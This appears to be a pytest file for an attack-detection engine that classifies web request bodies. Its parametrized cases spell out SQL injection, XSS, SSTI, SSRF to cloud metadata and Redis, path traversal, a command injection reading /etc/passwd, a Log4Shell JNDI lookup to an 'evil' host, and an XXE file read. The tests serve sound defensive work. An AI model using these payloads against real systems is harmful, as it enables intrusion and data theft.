"""
Tests de l'analyse du corps des requêtes (middleware applicatif -> /api/ingest).
"""
import pytest

from app.detection.engine import analyze_request, flatten_body


def req(body, path="/api/checkout/", status=200, ip="81.2.69.142", **kw):
    return {"method": "POST", "path": path, "status": status, "ip": ip, "body": body, **kw}


@pytest.mark.parametrize("body,expected", [
    ({"username": "admin' OR 1=1--", "password": "x"}, "Tentative d'Injection SQL"),
    ({"q": ["1 UNION SELECT card FROM payments"]}, "Tentative d'Injection SQL"),
    ({"comment": "<script>document.location='//evil'</script>"}, "Tentative de Cross-Site Scripting (XSS)"),
    ("name=%3Cscript%3Ealert(1)%3C%2Fscript%3E", "Tentative de Cross-Site Scripting (XSS)"),
    ({"order": {"items": [{"note": "{{7*7}}"}]}}, "Tentative d'Injection de Template (SSTI)"),
    ({"avatar_url": "http://169.254.169.254/latest/meta-data/"}, "Tentative de SSRF (Falsification de Requête Côté Serveur)"),
    ({"webhook": "gopher://127.0.0.1:6379/_FLUSHALL"}, "Tentative de SSRF (Falsification de Requête Côté Serveur)"),
    ({"file": "../../../etc/passwd"}, "Tentative de Path Traversal"),
    ({"host": "example.com; cat /etc/passwd"}, "Tentative d'Injection de Commande"),
    ({"ua": "${jndi:ldap://evil/a}"}, "Tentative Log4Shell (Log4J)"),
    ('<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>', "Tentative XXE (Injection d'Entité XML)"),
])
def test_body_attacks(body, expected):
    ev = analyze_request(req(body), "tikipay")
    assert ev["attack_type"] == expected
    assert "corps" in ev["detail"]


@pytest.mark.parametrize("body", [
    {"first_name": "Jean-François", "last_name": "O'Connor", "email": "jf@example.com"},
    {"comment": "Super concert, merci ! On revient en 2027 :) -- l'équipe était top"},
    {"event": "Festival 1=1 ?", "qty": 2, "price": 15.5, "seats": ["A1", "A2"]},
    {"address": "12 rue de l'Église", "city": "Lyon", "company": "ACME"},
    {"description": "Tarif réduit pour les étudiants & seniors (sur présentation d'un justificatif)"},
    {"url": "https://www.example.com/page?ref=newsletter"},
    "",
    None,
])
def test_legit_bodies(body):
    assert analyze_request(req(body), "tikipay")["attack_type"] is None


def test_sensitive_values_never_stored():
    ev = analyze_request(req({"email": "a@b.c", "password": "' OR '1'='1", "csrfmiddlewaretoken": "abc"}), "tikipay")
    assert ev["attack_type"] == "Tentative d'Injection SQL"
    assert "OR '1'='1" not in ev["raw"]
    assert "masquée" in ev["raw"]


def test_excerpt_limited_to_attacked_field():
    ev = analyze_request(req({"username": "admin' OR 1=1--", "password": "MonVraiMotDePasse"}), "tikipay")
    assert "MonVraiMotDePasse" not in ev["raw"]
    assert "admin' OR 1=1--" in ev["raw"]


def test_client_ip_behind_proxy():
    ev = analyze_request(req({"q": "x"}, ip="172.18.0.4", xff="81.2.69.160"), "tikipay")
    assert ev["ip"] == "81.2.69.160"
    ev = analyze_request(req({"q": "x"}, ip="81.2.69.142", xff="1.2.3.4"), "tikipay")
    assert ev["ip"] == "81.2.69.142"  # X-Forwarded-For ignoré si la connexion vient d'une IP publique


def test_url_attack_also_detected():
    ev = analyze_request(req({}, path="/search?q=1 UNION SELECT password FROM users"), "tikipay")
    assert ev["attack_type"] == "Tentative d'Injection SQL"


def test_flatten_body():
    assert flatten_body({"a": {"b": [1, {"c": "x"}]}, "d": None}) == [("a.b[0]", "1"), ("a.b[1].c", "x")]
    assert flatten_body("brut") == [("", "brut")]
